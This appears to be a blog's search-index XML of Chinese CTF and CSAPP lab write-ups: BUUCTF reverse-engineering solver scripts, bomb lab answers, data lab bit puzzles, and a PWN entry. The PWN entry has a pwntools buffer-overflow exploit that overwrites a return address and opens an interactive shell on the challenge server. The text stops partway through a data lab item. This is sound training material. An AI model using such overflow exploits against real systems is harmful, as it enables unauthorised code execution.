<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BUU_RE</title>
    <link href="/2021/07/12/BUU-RE/"/>
    <url>/2021/07/12/BUU-RE/</url>
    
    <content type="html"><![CDATA[<h1 id="cBUU-RE"><a href="#cBUU-RE" class="headerlink" title="cBUU RE"></a>cBUU RE</h1><h3 id="simplerev"><a href="#simplerev" class="headerlink" title="simplerev"></a>simplerev</h3><p>核心函数</p><p><img src="https://i.loli.net/2021/05/29/Z8uNeX4qtbdVATG.png" alt="image-20210529003720924"></p><p>脚本</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ll long long</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">char</span> a[<span class="hljs-number">10</span>];<br><span class="hljs-keyword">char</span> b[<span class="hljs-number">10</span>];<br><span class="hljs-keyword">int</span> temp;<br><span class="hljs-keyword">char</span> key[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;adsfkndcls&quot;</span>;<br><span class="hljs-keyword">char</span> key3[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;killshadow&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">128</span>;j++)&#123;<br><span class="hljs-keyword">if</span>(((j - <span class="hljs-number">39</span> - key[i] + <span class="hljs-string">&#x27;a&#x27;</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>)==key3[i])&#123;<br><span class="hljs-keyword">if</span>(j&gt;=<span class="hljs-string">&#x27;A&#x27;</span>&amp;&amp;j&lt;=<span class="hljs-string">&#x27;Z&#x27;</span>)&#123;<br>a[i]=j;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//KLDQCUDFZO</span><br></code></pre></td></tr></table></figure><p>这里需要注意的是这个题目，他啊，是有问题的。</p><p>这里看到我只对大写做了判别，但其实大小写混写都是可以的。所以我怀疑这道题的答案应该是100（10的2次方）种，所以我觉得这题有点不讲武德。</p><h3 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h3><p>属实没看懂，mad</p><p><img src="C:\Users\77161\AppData\Roaming\Typora\typora-user-images\image-20210703153514436.png" alt="image-20210703153514436"></p><p>运行程序，然后我直接蒙了，拿鼠标挂了好久，我怀疑这是诈骗</p><p><img src="C:\Users\77161\AppData\Roaming\Typora\typora-user-images\image-20210703153548753.png" alt="image-20210703153548753"></p><p>然后还是ida打开，（没加壳</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall <span class="hljs-title">WinMain</span><span class="hljs-params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="hljs-keyword">int</span> nShowCmd)</span></span><br><span class="hljs-function"></span>&#123;<br>  DialogBoxParamA(hInstance, (LPCSTR)<span class="hljs-number">0x67</span>, <span class="hljs-number">0</span>, DialogFunc, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>很显然，main函数中这个应该是对话框的函数</p><p>打开DialogFunc看看</p><p><img src="C:\Users\77161\AppData\Roaming\Typora\typora-user-images\image-20210703153702525.png" alt="image-20210703153702525"></p><p>这里是主函数没有错了</p><p>逐一分析</p><p>首先一开头给input清空了位置，并且读入了字符，不难发现应该是八位</p><p>然后是一个</p><p>一个sort，</p><p>加上两个base64（不换表</p><p>结果就出来了</p><h3 id="简单的注册器"><a href="#简单的注册器" class="headerlink" title="简单的注册器"></a>简单的注册器</h3><p><img src="C:\Users\77161\AppData\Roaming\Typora\typora-user-images\image-20210705170743119.png" alt="image-20210705170743119"></p><p>payload：4b4zzzzzzzzzzzzzzzzzzzzzzzzzzzza</p><p>或者直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">flag=<span class="hljs-built_in">list</span>(<span class="hljs-string">b&quot;dd2940c04462b4dd7c450528835cca15&quot;</span>)<br>flag[<span class="hljs-number">2</span>]=flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-<span class="hljs-number">50</span><br>flag[<span class="hljs-number">4</span>]=flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">5</span>]-<span class="hljs-number">48</span><br>flag[<span class="hljs-number">30</span>]=flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">9</span>]-<span class="hljs-number">48</span><br>flag[<span class="hljs-number">14</span>]=flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-<span class="hljs-number">97</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag&#123;&quot;</span>+<span class="hljs-built_in">bytes</span>(flag).decode()[::-<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到flag</p><p>flag{59acc538825054c7de4b26440c0999dd}</p><h3 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h3><p>这题是真做的血压高</p><p>（自己的py水平有待提高<img src="https://i.loli.net/2021/07/06/fUKMRXPz1NEQ5Tc.png" alt="image-20210706134426642"></p><p>这个是pyc逆向后的源码，</p><p>显而易见，input应该就是flag了，然后code已经给出，先进行逐位相异或，然后对得到的code进行变换。</p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">code = [<span class="hljs-string">&#x27;\x1f&#x27;</span>, <span class="hljs-string">&#x27;\x12&#x27;</span>, <span class="hljs-string">&#x27;\x1d&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;\x01&#x27;</span>, <span class="hljs-string">&#x27;\x06&#x27;</span>, <span class="hljs-string">&#x27;\x14&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;\x1b&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;\x01&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;\x13&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(code)):<br>        code[i]=<span class="hljs-built_in">ord</span>(code[i])<br><span class="hljs-built_in">print</span>(code)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(code)-<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>    code[j]=code[j]^code[j+<span class="hljs-number">1</span>]<br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(code)):<br>    code[w]=code[w]-w<br>    <span class="hljs-keyword">if</span> code[w]&lt;<span class="hljs-number">0</span>:<br>        code[w]+=<span class="hljs-number">128</span><br>    flag+=<span class="hljs-built_in">chr</span>(code[w])<br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>BUU</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU_PWN</title>
    <link href="/2021/07/12/BUU-PWN/"/>
    <url>/2021/07/12/BUU-PWN/</url>
    
    <content type="html"><![CDATA[<h1 id="BUU-PWN"><a href="#BUU-PWN" class="headerlink" title="BUU PWN"></a>BUU PWN</h1><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>TEST_your_nc</p><p><img src="C:\Users\77161\AppData\Roaming\Typora\typora-user-images\image-20210511235204041.png" alt="image-20210511235204041"></p><p>nc 连接然后cat flag 即可</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><img src="C:\Users\77161\AppData\Roaming\Typora\typora-user-images\image-20210511235252300.png" alt="image-20210511235252300"></p><p>下载附件可以得到</p><p><img src="C:\Users\77161\AppData\Roaming\Typora\typora-user-images\image-20210511235626817.png" alt="image-20210511235626817"></p><p>可以看到gets猜想大概是溢出攻击</p><p>然后看到fun函数中有敏感字符</p><p><img src="C:\Users\77161\AppData\Roaming\Typora\typora-user-images\image-20210511235706687.png" alt="image-20210511235706687"></p><p>所以直接溢出攻击，</p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-string">&#x27;29553&#x27;</span>)<br>p=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">15</span>+p64(<span class="hljs-number">0x401186</span>)<br><span class="hljs-built_in">print</span>(p)<br>io.sendline(p)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="C:\Users\77161\AppData\Roaming\Typora\typora-user-images\image-20210511235840314.png" alt="image-20210511235840314"></p><p>得到弗莱格。</p><p>持续更新中~</p>]]></content>
    
    
    
    <tags>
      
      <tag>BUU</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP_BOMB_LAB</title>
    <link href="/2021/07/12/CSAPP-BOMB-LAB/"/>
    <url>/2021/07/12/CSAPP-BOMB-LAB/</url>
    
    <content type="html"><![CDATA[<h1 id="Bomblab"><a href="#Bomblab" class="headerlink" title="Bomblab"></a>Bomblab</h1><p>听Q师傅说这个是re的入门，那我是真的菜，汇编是一边学一边看的，主要是一般都直接ida反编译，都没怎么重视汇编，这次一定好好学（下次一定</p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/7ymn3lATg5j2oFk.png" alt="image-20210407234313042"></p><p>对于call 0x401338这个地址我们可以猜测大概是一个字符串比较，然后他将0x402400这个位置的东西赋值给了esi，不难想象应该是比较输入输出然后看.</p><p>IDA特供</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">strings_not_equal</span><span class="hljs-params">(_BYTE *a1, _BYTE *a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  _BYTE *v2; <span class="hljs-comment">// rbx</span><br>  _BYTE *v3; <span class="hljs-comment">// rbp</span><br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// er12</span><br>  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// edx</span><br><br>  v2 = a1;<br>  v3 = a2;<br>  v4 = string_length(a1);<br>  v5 = string_length(a2);<br>  v6 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( v4 == v5 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *a1 )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( *a1 == *a2 )<br>      &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          ++v2;<br>          ++v3;<br>          <span class="hljs-keyword">if</span> ( !*v2 )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( *v2 == *v3 );<br>        v6 = <span class="hljs-number">1</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v6 = <span class="hljs-number">1</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v6 = <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v6;<br>&#125;<br></code></pre></td></tr></table></figure><p>显然,跳过第一个bomb就是输出那一串字符。</p><p>（这里我尝试了一下让*a1=0，也就是不申请a1的地址，但是a1是输入，貌似异想天开了，所以就只能是a1==a2了）</p><p>answer:    Border relations with Canada have never been better.</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210408170714090.png" alt="image-20210408170714090"></p><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210408171244346.png" alt="image-20210408171244346"></p><p>先用IDA写吧，以后看得懂一点汇编了再说一下汇编，这里从IDA可以直接看到，它是先读取了六个数字，然后内部就不截图了，v3就是第一个数的值，这里发现是要1，然后看到后面的逻辑，后面每个数要是前面的两倍，显而易见就是1 2 4 8 16 32</p><p>（PS:Q师傅别骂了,再骂人没了</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/ksqPud2T7myWE6O.png" alt="image-20210408175459815"></p><p>这里需要注意的是<img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210409162419240.png" alt="image-20210409162419240"></p><p>这里v8这个数组被定义成了int64,这时候我们看下面的代码中v8[0]被拆成了两部分运行，这里就是用ida的不好了，ida在反编译时会犯病，查看gdb</p><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210409170100591.png" alt="image-20210409170100591"></p><p>可以发现读的并不是int64 可以发现读取的应该是</p><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210409170414928.png" alt="image-20210409170414928"></p><p>所以在ida里面把v8数组取成int（我这里错了好久，我以为是取v8[0]的高八位和低八位，别骂了，再也不用ida了（下次还敢</p><p>那接下来就很简单了</p><p>就是输入第一个数然后在反编译里找对应的。</p><p>Answer:    </p><p>0 207</p><p>1 311</p><p>2 707</p><p>3 256</p><p>4 389</p><p>5 206</p><p>6 682</p><p>7 327</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210409172842957.png" alt="image-20210409172842957"></p><p>这题跟上题一样犯病，已经改过来了。</p><p>然后先看判断条件，读取数字不能等于2，还有第一个数字要大于14</p><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210409173028230.png" alt="image-20210409173028230"></p><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210409173041484.png" alt="image-20210409173041484"></p><p>这里应该是result返回0,v8[1]返回0.然后看向func4这个函数，里面自己有一个循环</p><p>其实这个函数给我的感觉有点像二叉树，但是又不是，反正很绕，但是显然要返回result只有两个办法，一种是直接让a1=v3=7，一种是在两个if里面套出result=0，但是显然要想让两个if出0显然不可能，因为两个return会不断回跳，直到v3=a1，但是第二个return是有一个+1的，所以不能经过v3&lt;a1的情况。为了避免麻烦还是直接让a1=v3=7吧。</p><p>(这题讲真，有ida的话有手就行，gdb搞了我半天，我没搞出来，那个jmp没看懂，原来是递归，我裂了)</p><p>so ,The Answer :7 0</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210410004452131.png" alt="image-20210410004452131"></p><p>这题被小坑了一下，就在那个v3取值那里，我以为是int化，结果要的是ascii码，我裂了</p><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210410004647615.png" alt="image-20210410004647615"></p><p>反正就是输入六个字母，使之acsii的低四位的表达在数组里能变成出flyers；</p><p>0x9FE567 (数组需要的低四位)</p><p>Answer:    yonuvw（这个答案很多，就是低四位符合就行，又是一道有手就行的题。</p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>源码相当长，又臭又长，（TMD写了两个小时不断地在ida和gdb两边跳，汇编看不懂太痛苦了，ida显示又有问题</p><p>一步一步来</p><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210410014112722.png" alt="image-20210410014112722"></p><p>先是读入六个数字，然后一个死循环，这里直接说意思，就是必须要出六个数，这六个数小于等于6，且互不相同。</p><p>这里ida有问题，他这里是&gt;，但是在gdb里面</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x0000000000401121</span> &lt;+<span class="hljs-number">45</span>&gt;:    jbe    <span class="hljs-number">0</span>x<span class="hljs-number">401128</span> &lt;phase_<span class="hljs-number">6</span>+<span class="hljs-number">52</span>&gt;<br></code></pre></td></tr></table></figure><p>用的是jbe所以是小于等于。</p><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210410014348288.png" alt="image-20210410014348288"></p><p>这里是与7取互补，以上都是这道题最简单的地方。</p><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210410014423255.png" alt="image-20210410014423255"></p><p>这里开始变态起来了，这里看了半天看不懂这个node1是个der，联想到这样的地址操作还有node这个名字，猜测大概是链表，而且在ida里，这个nodeTMD是个UNKNOWN，这个v6=v6[1]的这个操作说实话，我现在还不是很懂，为什么ida会读成这个样子，希望有师傅看到这里能帮我答题解惑，然后我就看了眼gdb</p><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210410014836946.png" alt="image-20210410014836946"></p><p>才明白这个链表中的node早就在那里了，甚至整个链表中的值已经在寄存器了，我们决定的只是这个链表的顺序，</p><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210410015132918.png" alt="image-20210410015132918"></p><p>后面这一串大概是按照我们的顺序构建新链表吧（大概，我也是猜的，因为我也不是看的很懂，到时候汇编懂一点，去看汇编，这个ida是有点难用。</p><p>PS:睡了两个小时，我发现上面那一步已经把节点值取出来了，现在又搞不懂这个for有个der用了，现在把意思重新表达一下，其实这道题只是把一个链表中的值拿出来，并且从大到小。</p><p>然后下面那个部分应该是判别是否在整个链表中递减，然后我把node里的东西x出来了</p><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210410014004232.png" alt="image-20210410014004232"></p><p>14c    a8    39c    2b3    1dd    1bb    </p><p>原顺序： 3 4 5 6 1 2</p><p>取补后：4 3 2 1 6 5</p><p><img src="https://raw.githubusercontent.com/EaKal-7/Images/main/image-20210410021726880.png" alt="image-20210410021726880"></p><p>bomblab done，学到的东西还是挺多的，学会了怎么用gdb，稍微看一点点的汇编（汇编真的要认真学啊</p>]]></content>
    
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP_DATA_LAB</title>
    <link href="/2021/07/12/CSAPP-DATA-LAB/"/>
    <url>/2021/07/12/CSAPP-DATA-LAB/</url>
    
    <content type="html"><![CDATA[<h1 id="csapp-data-lab"><a href="#csapp-data-lab" class="headerlink" title="csapp data lab"></a>csapp data lab</h1><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * bitXor - x^y using only ~ and &amp; </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Example: bitXor(4, 5) = 1</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Legal ops: ~ &amp;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Max ops: 14</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Rating: 1</span><br><span class="hljs-comment">*/</span><br>   <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bitXor</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>     <span class="hljs-keyword">return</span> ~(~(x&amp;~y)&amp;~(~x&amp;y));<br>   &#125;<br></code></pre></td></tr></table></figure><p>   这个学过一点离散数学都应该知道，嘻嘻。其实我一开始写出来的表达式 “(<del>x&amp;y)|(x&amp;</del>y)”把这个化一下就行了。</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">tmin</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>//这题的意思是要输出最小的二进制补码,就直接输出就好了</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span><br><span class="hljs-comment"> *     and 0 otherwise </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | +</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isTmax</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> y=x+<span class="hljs-number">1</span>;<br>  x+=y;<br>  x=~x;<br>  y=!y;<span class="hljs-comment">//4</span><br>  x+=y;<span class="hljs-comment">//5</span><br>  <span class="hljs-keyword">return</span> !x;<br>&#125;<br></code></pre></td></tr></table></figure><p>这题参考了CSDN，确实没想到，方法还是比较奇妙的。首先说明以下这题的意思，如果x为最大的二进制补码就输出1，否则为0；<br>这题不难想到最大的补码应该是符号位为0，其余都是1。因为输出是0or1，所以考虑到将x化为全0，然后做！运算，这样得到的就是1or0，其次要排除-1，即符号位为1，其余也都是1，这里用4,5行做了排除。</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span><br><span class="hljs-comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span><br><span class="hljs-comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">allOddBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> BBits=<span class="hljs-number">0xAA</span>;<br>  BBits=BBits+(BBits&lt;&lt;<span class="hljs-number">8</span>);<br>  BBits=BBits+(BBits&lt;&lt;<span class="hljs-number">16</span>);<br>  <span class="hljs-keyword">return</span> (x&amp;BBits)^BBits;<br>&#125;<br></code></pre></td></tr></table></figure><p>这题目说实话贼简单，先说意思吧，就是如果一个数的奇数位全为1就输出1，只要简单的构造一个掩码，这个掩码为最大的奇数全为1的数，然后做异或。（这里插一个题外话，这个lab的构造的常数只能0-255，所以，不能直接创建0XAAAAAAAAAAA</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">negate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这题目就是不用·，然后输出·x，也是有手⑨☆。就是常识题。</p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td 